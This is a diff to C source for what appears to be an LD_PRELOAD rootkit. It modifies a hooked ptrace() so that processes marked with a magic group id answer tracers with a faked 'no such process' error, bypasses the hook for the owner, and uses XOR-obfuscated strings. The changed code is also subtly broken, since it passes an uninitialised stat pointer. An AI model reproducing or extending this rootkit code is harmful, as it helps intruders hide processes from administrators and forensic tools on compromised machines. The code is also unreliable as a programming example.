@@ -6,19 +6,20 @@ long ptrace(void *request, pid_t pid, void *addr, void *data)
     
     HOOK(old_ptrace, CPTRACE);
     
+    if(owned()) return old_ptrace(request, pid, addr, data);
+    
     char proc_path[128];
     snprintf(proc_path, sizeof(proc_path), "/proc/%d", pid);
     
-    HOOK(old_stat, CSTAT);
+    HOOK(old_xstat, C__XSTAT);
     struct stat *pstat;
-    if(old_stat(proc_path, pstat) < 0) return old_ptrace(request, pid, addr, data);
-    if(pstat->st_gid == MAGIC_GID) exit(-1);
+    memset(&pstat, 0, sizeof(pstat));
+    if(old_xstat(__STAT_VER, proc_path, pstat) < 0) return old_ptrace(request, pid, addr, data);
+    if(pstat->st_gid == MAGIC_GID) { errno = ESRCH; return -1; }
 
     #ifndef PTRACE_BUG
         return old_ptrace(request, pid, addr, data);
     #endif
-
-    if(owned()) return old_ptrace(request, pid, addr, data);
 
     char *ptrace_bug_msg = strdup(PTRACE_BUG_MSG);
     xor(ptrace_bug_msg);
